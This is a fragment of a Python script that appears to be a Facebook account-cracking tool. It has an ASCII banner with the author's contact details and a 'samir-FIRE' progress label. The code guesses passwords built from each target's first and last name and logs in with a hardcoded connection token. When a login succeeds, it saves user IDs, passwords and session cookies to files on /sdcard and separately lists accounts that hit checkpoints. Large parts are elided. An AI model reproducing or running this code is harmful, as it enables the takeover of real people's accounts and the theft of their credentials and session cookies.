...
. ######:: ##:::: ##: ##:::: ##:'####: ##:::. ##:
:......:::..:::::..::..:::::..::....::..:::::..::
\t[Ã—] Developed By samir khan{EXTRA} (samir)
{WHITE}[â€¢] AUTHOR       : alone samir
{WHITE}[â€¢] WhatsApp     :   +923406490858
[â€¢] FaceBook     :   samir khan
[â€¢] Version      :   {RED}0.1
{WHITE}[â€¢] YouTube      :   samir pathan

{WHITE}========samir========XD========PAPA==================ðŸ’”======
...
class Main:
    ...
    def method1(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [samir-FIRE] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                ...
                if "session_key" in q:
                    ...
                    cookie = f"sb={sb};{coki}"
                    p('\r\033[1;92m[LEGEND-samir-OK] %s | %s \033[1;97m '%(uid,pw))
                    ok.append(uid)
                    open('/sdcard/samir_M1_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/samir_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m[ALONE-samir-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
